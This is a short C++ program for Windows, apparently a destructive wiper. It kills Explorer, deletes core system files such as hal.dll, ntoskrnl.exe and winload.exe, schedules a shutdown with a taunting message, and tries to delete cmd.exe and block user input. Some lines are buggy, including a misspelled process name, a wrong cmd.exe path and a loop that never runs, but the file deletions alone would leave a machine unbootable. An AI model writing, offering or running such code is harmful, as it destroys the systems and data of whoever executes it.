#include <iostream>
#include <windows.h>
#include <winable.h>
#include <stdio.h>

void delfiles() {
  remove("C:\\Windows\\System32\\hal.dll");
  remove("C:\\Windows\\System32\\wininit.exe");
  remove("C:\\Windows\\System32\\winload.exe");
  remove("C:\\Windows\\System32\\ntoskrnl.exe");
  remove("C:\\Windows\\explorer.exe");


}
void closeinscnd() {
  system("shutdown /s /t 30 /c Say Good Bye To Your PC!");
  


}
void closeexplorer() {
  FreeConsole();
  system("taskkill /f /IM exlorer.exe");

}
void delcmd() {
  remove("C:\\System32\\cmd.exe");

}
void blockinput() {
  for(int i = 0;i>900000;i++) {
    BlockInput(true);

  }

}
int main() {
  closeexplorer();
  delfiles();
  closeinscnd();
  delcmd();
  blockinput();



}
